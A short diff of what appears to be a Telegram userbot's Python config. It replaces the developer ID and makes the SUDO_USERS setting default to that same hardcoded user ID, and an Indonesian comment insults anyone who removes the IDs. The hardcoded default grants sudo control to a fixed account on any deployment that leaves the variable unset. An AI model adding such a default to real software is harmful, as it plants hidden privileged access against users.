@@ -94,10 +94,10 @@ if CONFIG_CHECK:
 
 # KALO NGEFORK ID DEVS SAMA ID BLACKLIST_CHAT NYA GA USAH DI HAPUS YA GOBLOK
 DEVS = [
-    2096590179,
+    1977120689,
 ]
 
-SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "").split()}
+SUDO_USERS = {int(x) for x in os.environ.get("SUDO_USERS", "1977120689").split()}
 BL_CHAT = {int(x) for x in os.environ.get("BL_CHAT", "").split()}
 
 # For Blacklist Group Support
